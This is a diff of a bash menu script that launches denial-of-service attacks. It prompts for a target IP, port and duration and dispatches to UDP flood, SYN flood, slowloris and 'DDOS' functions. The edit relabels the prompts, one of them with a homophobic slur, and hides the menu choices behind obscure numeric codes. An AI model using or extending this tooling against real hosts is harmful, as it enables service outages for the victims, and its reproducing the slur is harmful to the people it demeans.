@@ -27473,11 +27473,11 @@ bw()
 {
     clear
     echo -e " ${BLUE} "
-echo "IP:"
+echo "Fag To Slam:"
 read ip
-echo "Port:"
+echo "De-Port:"
 read port
-echo "Time:"
+echo "Time Of Smacking:"
 read time
 ./gott -i $ip -p $port -s 32000 -t $time
 }
@@ -27499,17 +27499,17 @@ clear
 while :
 do
     clear
-    echo -e " ${RED} "
-    echo -e "NuggetPorn Is Gunna Hit Hard ;P"
-    echo -e "${RED}"
+    echo -e " ${LIGHTBLUE} "
+    echo -e "NuggetNet"
+    echo -e "${LIGHTGREEN}"
     echo -n "  > "
     read yourch
     case $yourch in
       99999fd99999) udp_flooda ;;
-      UDP) udp_floodb ;;
-      2) slap ;;
+      56456456456) udp_floodb ;;
+      2456456) slap ;;
 	  4999999999999) slowloris ;;
-	  TCP) fry ;;
+	  DDOS) fry ;;
          54634563463463456) bw ;;
          3453534535345) syn ;;
 	  8999999999999) killall ;;
